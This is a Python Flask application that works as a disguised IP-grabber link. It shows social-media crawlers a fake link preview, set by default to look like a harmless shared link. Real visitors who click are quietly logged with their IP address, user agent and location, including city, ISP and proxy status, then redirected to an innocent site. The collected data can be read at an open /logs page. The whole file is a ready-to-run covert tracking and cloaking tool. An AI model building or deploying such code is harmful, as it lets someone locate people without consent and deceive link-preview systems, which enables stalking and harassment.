from flask import Flask, request, redirect, render_template_string
import json
import os
from datetime import datetime
import requests

app = Flask(__name__)

# ── Configuration ────────────────────────────────────────────────────────────
REDIRECT_URL = os.environ.get("REDIRECT_URL", "https://www.airbnb.com")
LOG_FILE     = os.environ.get("LOG_FILE", "logs.json")

OG_TITLE       = os.environ.get("OG_TITLE",       "Check this out")
OG_DESCRIPTION = os.environ.get("OG_DESCRIPTION", "")
OG_IMAGE       = os.environ.get("OG_IMAGE",       "")
OG_URL         = os.environ.get("OG_URL",         "")

# Known crawler User-Agent substrings
CRAWLERS = [
    "TelegramBot",
    "Discordbot",
    "Twitterbot",
    "Slackbot",
    "WhatsApp",
    "facebookexternalhit",
    "LinkedInBot",
    "iMessageBot",
    "Googlebot",
    "bingbot",
]

# ── Helpers ──────────────────────────────────────────────────────────────────

def is_crawler(user_agent: str) -> bool:
    ua = user_agent or ""
    return any(c.lower() in ua.lower() for c in CRAWLERS)


def geolocate(ip: str) -> dict:
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,regionName,city,isp,org,mobile,proxy,hosting",
                         timeout=3)
        return r.json()
    except Exception:
        return {}


def log_hit(ip: str, user_agent: str, geo: dict):
    entry = {
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "ip": ip,
        "user_agent": user_agent,
        "geo": geo,
    }
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            try:
                logs = json.load(f)
            except Exception:
                logs = []
    logs.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)
    print(f"[HIT] {entry['timestamp']} | {ip} | {geo.get('city','?')}, {geo.get('country','?')} | {user_agent[:80]}")


# ── Preview HTML template ────────────────────────────────────────────────────

PREVIEW_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta property="og:title"       content="{{ title }}">
  <meta property="og:description" content="{{ description }}">
  <meta property="og:image"       content="{{ image }}">
  <meta property="og:url"         content="{{ url }}">
  <meta name="twitter:card"        content="summary_large_image">
  <meta name="twitter:title"       content="{{ title }}">
  <meta name="twitter:description" content="{{ description }}">
  <meta name="twitter:image"       content="{{ image }}">
  <title>{{ title }}</title>
</head>
<body></body>
</html>"""


# ── Routes ───────────────────────────────────────────────────────────────────

@app.route("/")
def index():
    ua = request.headers.get("User-Agent", "")

    if is_crawler(ua):
        # Serve the fake preview to the crawler
        return render_template_string(
            PREVIEW_TEMPLATE,
            title=OG_TITLE,
            description=OG_DESCRIPTION,
            image=OG_IMAGE,
            url=OG_URL or request.url,
        )

    # Real user -- log and redirect
    ip  = request.headers.get("X-Forwarded-For", request.remote_addr)
    ip  = ip.split(",")[0].strip()
    geo = geolocate(ip)
    log_hit(ip, ua, geo)
    return redirect(REDIRECT_URL, code=302)


@app.route("/logs")
def view_logs():
    """Simple plaintext log viewer. Remove or password-protect in production."""
    if not os.path.exists(LOG_FILE):
        return "No hits yet.", 200, {"Content-Type": "text/plain"}
    with open(LOG_FILE) as f:
        return f.read(), 200, {"Content-Type": "application/json"}


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)